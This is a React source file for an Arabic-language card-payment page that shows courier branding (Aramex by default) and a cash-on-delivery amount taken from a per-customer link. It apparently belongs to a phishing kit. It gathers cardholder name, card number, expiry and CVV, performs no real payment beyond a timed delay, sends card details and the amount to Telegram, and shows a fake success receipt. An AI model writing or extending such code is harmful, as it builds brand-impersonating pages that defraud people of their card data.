import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Shield, Lock, Calendar } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);

  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);

    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);

      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };

  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "بيانات ناقصة",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }

    const expiryDate = `${expiryMonth}/${expiryYear}`;
    if (!validateExpiry(expiryDate)) {
      toast({
        title: "تاريخ انتهاء الصلاحية غير صحيح",
        description: "الرجاء التحقق من تاريخ انتهاء الصلاحية",
        variant: "destructive",
      });
      return;
    }

    if (!validateCVV(cvv)) {
      toast({
        title: "رمز الأمان غير صحيح",
        description: "الرجاء التحقق من رمز الأمان (CVV)",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Here you would typically make an API call to process the payment
      // For demo purposes, we'll just show success

      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send to Telegram
      if (customerInfo?.email || shippingInfo?.customer_email) {
        await sendToTelegram({
          message: `✅ تم استلام دفعة جديدة\n\n💳 بيانات البطاقة:\n- اسم الحامل: ${cardName}\n- رقم البطاقة: **** **** **** ${cardNumber.slice(-4)}\n- انتهاء الصلاحية: ${expiryMonth}/${expiryYear}\n\n💰 المبلغ: ${formattedAmount}\n🌍 الدولة: ${selectedCountryData?.nameAr || selectedCountry}`,
        });
      }

      navigate(`/pay/${id}/receipt?success=true&amount=${amount}&currency=${selectedCountry}&service=${serviceKey}`);
    } catch (error) {
      console.error("Payment error:", error);
      toast({
        title: "خطأ في معالجة الدفع",
        description: "حدث خطأ أثناء معالجة الدفع. الرجاء المحاولة مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const cardType = detectCardType(cardNumber);

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`إدخال بيانات البطاقة الائتمانية لإتمام الدفع - ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      theme="day"
    >
      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Cardholder Name */}
        <div>
          <Label className="mb-2 text-sm font-medium text-gray-700">
            اسم حامل البطاقة
          </Label>
          <Input
            placeholder="AHMAD ALI"
            value={cardName}
            onChange={(e) => setCardName(e.target.value.toUpperCase())}
            className="h-12 bg-gray-50 border-gray-200"
          />
      </div>

        {/* Card Number */}
        <div>
          <Label className="mb-2 text-sm font-medium text-gray-700">
            رقم البطاقة
          </Label>
          <div className="relative">
            <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
            <Input
              placeholder="0000 0000 0000 0000"
              value={cardNumber}
              onChange={(e) => handleCardNumberChange(e.target.value)}
              inputMode="numeric"
              className="h-12 bg-gray-50 border-gray-200 pr-10 font-mono tracking-wider"
              maxLength={19}
            />
          </div>
        </div>

        {/* Expiry & CVV */}
        <div className="grid grid-cols-2 gap-4">
          {/* Expiry Date */}
          <div>
            <Label className="mb-2 text-sm font-medium text-gray-700">
              تاريخ الانتهاء
            </Label>
            <div className="grid grid-cols-2 gap-2">
              <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                <SelectTrigger className="h-12 bg-gray-50 border-gray-200">
                  <SelectValue placeholder="الشهر" />
                </SelectTrigger>
                <SelectContent>
                  {months.map((m) => (
                    <SelectItem key={m.value} value={m.value}>
                      {m.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={expiryYear} onValueChange={setExpiryYear}>
                <SelectTrigger className="h-12 bg-gray-50 border-gray-200">
                  <SelectValue placeholder="السنة" />
                </SelectTrigger>
                <SelectContent>
                  {years.map((y) => (
                    <SelectItem key={y.value} value={y.value}>
                      {y.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
        </div>
          </div>

          {/* CVV */}
          <div>
            <Label className="mb-2 text-sm font-medium text-gray-700">CVV</Label>
            <div className="relative">
              <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
              <Input
                placeholder="•••"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                inputMode="numeric"
                type="password"
                className="h-12 bg-gray-50 border-gray-200 pr-10 text-center font-mono"
                maxLength={4}
              />
        </div>
          </div>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-12 text-base font-bold text-white transition-all"
          style={{ backgroundColor: branding.colors.primary }}
          disabled={isSubmitting || !cardValid}
        >
          {isSubmitting ? "جاري المعالجة..." : "تفويض والمتابعة"}
        </Button>
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
